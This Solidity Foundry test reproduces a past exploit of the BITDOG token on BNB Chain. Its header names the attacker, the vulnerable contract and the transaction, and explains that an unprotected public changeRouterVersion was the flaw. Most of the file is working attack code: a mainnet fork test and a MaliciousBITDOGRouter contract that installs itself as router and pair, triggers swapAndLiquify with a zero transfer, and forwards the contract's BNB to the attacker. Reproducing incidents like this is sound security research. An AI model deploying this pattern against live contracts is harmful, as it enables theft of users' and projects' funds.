// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2.10 BNB
// Attacker : 0x7b6a1f878bf29430788e743ee149ed2a3202f136
// Attack Contract : 0xdfdf4a3ec9ca12ccb46daabdc65b41ea852136ae
// Vulnerable Contract : 0x4bbb53252b0cee84e6824e85989ea2eddeec25f1
// Attack Tx : https://bscscan.com/tx/0xc0dcad5927446b9fa560be74a76efa0805e67d4c4cd486a48e9e4248287d777e
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x4bbb53252b0cee84e6824e85989ea2eddeec25f1#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/931
//
// Attack summary: The attacker replaced BITDOG's router and pair with an attacker-controlled helper,
// then triggered BITDOG.swapAndLiquify with a zero-amount transfer. The fake router performed no swap,
// so BITDOG treated its pre-existing BNB balance as swap proceeds and sent that balance to fake
// addLiquidityETH, which forwarded it to the attacker.
// Root cause: changeRouterVersion is public; the intended onlyOwner restriction is only a comment.

address constant ATTACKER = 0x7B6A1F878bf29430788e743Ee149eD2a3202F136;
address constant ROOT_ATTACK_CONTRACT = 0xDfdf4A3EC9CA12ccB46DAabDc65b41ea852136Ae;
address constant TRACE_HELPER = 0xc4b9D3Ed47A92aDd82cFAaB96b2d1D57E6887F04;
address constant BITDOG_TOKEN = 0x4BBb53252B0ceE84e6824e85989Ea2EddEec25F1;
address constant ROUTER_BEFORE = 0xE0dce975e949Fd437BC5e1072734020dE780C0f9;
string constant DEFAULT_BSC_RPC_URL = "https://bsc-mainnet.public.blastapi.io";

interface IBITDOG {
    function changeRouterVersion(
        uint256 efgnffw,
        address newRouterAddress
    ) external returns (address newPairAddress);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function balanceOf(
        address account
    ) external view returns (uint256);
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function uniswapPair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function _addliquidiwafiwvq(
        address account
    ) external view returns (bool);
}

contract ContractTest is BaseTestWithBalanceLog {
    receive() external payable {}

    function setUp() public {
        vm.createSelectFork(vm.envOr("BSC_RPC_URL", DEFAULT_BSC_RPC_URL), 48_728_493);

        fundingToken = address(0);
        attacker = address(this);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ROOT_ATTACK_CONTRACT, "Root Attack Contract");
        vm.label(TRACE_HELPER, "Trace Helper");
        vm.label(BITDOG_TOKEN, "BITDOG");
        vm.label(ROUTER_BEFORE, "Original BITDOG Router/Pair");
    }

    function testExploit() public balanceLog {
        IBITDOG bitdog = IBITDOG(BITDOG_TOKEN);

        uint256 victimBNBBefore = BITDOG_TOKEN.balance;
        assertEq(victimBNBBefore, 2_101_368_297_037_048_768);
        assertEq(bitdog.balanceOf(BITDOG_TOKEN), 728_860_419_400_885_283_502);
        assertEq(bitdog.minimumTokensBeforeSwapAmount(), 10_000_000_000_000_000_000);
        assertEq(bitdog.uniswapPair(), ROUTER_BEFORE);
        assertEq(bitdog.uniswapV2Router(), ROUTER_BEFORE);

        MaliciousBITDOGRouter fakeRouter = new MaliciousBITDOGRouter(BITDOG_TOKEN, address(this));
        assertFalse(bitdog._addliquidiwafiwvq(address(fakeRouter)));

        // step 1: install an attacker-controlled router/pair through the public changeRouterVersion path.
        fakeRouter.install();

        assertEq(bitdog.uniswapPair(), address(fakeRouter));
        assertEq(bitdog.uniswapV2Router(), address(fakeRouter));
        assertTrue(bitdog._addliquidiwafiwvq(address(fakeRouter)));

        // step 2: trigger swapAndLiquify. Amount zero is sufficient because the contract token balance
        // already exceeds minimumTokensBeforeSwapAmount at the fork block.
        bitdog.transfer(address(fakeRouter), 0);

        uint256 victimBNBAfter = BITDOG_TOKEN.balance;
        uint256 profit = address(this).balance;

        assertEq(victimBNBAfter, 0);
        assertEq(victimBNBBefore - victimBNBAfter, 2_101_368_297_037_048_768);
        assertGt(profit, 2.1 ether);
    }
}

contract MaliciousBITDOGRouter {
    address private immutable token;
    address private immutable profitReceiver;

    receive() external payable {}

    constructor(
        address _token,
        address _profitReceiver
    ) {
        token = _token;
        profitReceiver = _profitReceiver;
    }

    function install() external {
        IBITDOG(token).changeRouterVersion(0, address(this));
    }

    function factory() external view returns (address) {
        return address(this);
    }

    function WETH() external pure returns (address) {
        return address(0);
    }

    function getPair(
        address,
        address
    ) external view returns (address) {
        return address(this);
    }

    function createPair(
        address,
        address
    ) external view returns (address) {
        return address(this);
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external {}

    function addLiquidityETH(
        address,
        uint256 amountTokenDesired,
        uint256,
        uint256,
        address,
        uint256
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity) {
        (bool ok,) = profitReceiver.call{value: msg.value}("");
        require(ok, "profit transfer failed");
        return (amountTokenDesired, msg.value, 0);
    }
}
